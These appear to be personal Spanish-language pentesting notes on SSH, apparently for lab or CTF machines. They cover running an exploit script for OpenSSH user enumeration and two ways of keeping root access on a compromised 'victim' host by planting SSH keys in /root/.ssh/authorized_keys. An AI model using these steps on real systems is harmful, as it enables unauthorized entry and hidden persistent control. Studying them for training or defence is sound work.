----------
- Tags: #puerto  #enum  #terminal  #comands #reconocimiento 
-----------

- Conexion Sintaxis:
```bash
 ssh -p2222 mitch@10.10.155.184
`
``

-----------

- Enumeracion Usuarios *SHH  < 7.7*
searchsploit User enumeration (2) --> Usar con *python2* y redirigir Stdr al /dev/null. SINTAXIX:
```bash
python2 45939.py <IP> <usuario> 2>/dev/null
```

---------------------------

- Ganar ls
- *persistencia* en SSH una vez comprometida la maquina (poder volver a entrar como root sin proporcionar contraseña)
*EN NUESTRA MAQUINA*
```bash
ssh-keygen
//ENTER ENTER
```

- Importante borrar salto de linea al final del archivo
```bash
cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
```

*MAQUINA VICTIMA*
```bash
cd /root/.ssh/
nano authorized_keys
CTRL + V (pegar nuestra id_rsa.pub)
```

- Ya podriamos conectarnos por ssh sin proporicionar contraseña
```bash
ssh root@192.168.3.160 
```

---------------

## Persistencia #2 Desde maquina victima

- Desde maquina victima
-------------
```bash
cd /root/.ssh/
ssh-keygen
```

```bash
cat id_rsa > authorized_keys
//Copiar el id_rsa
```

- Desde Maquina Anfitrion
```bash
nano id_rsa_root_ipMaquinavictima
chmod 600 id_rsa_root_ipMaquinaVictima

ssh -i id_rsa_root_ipMaquinaVictima root@ipMaquinaVictima
```


---------------

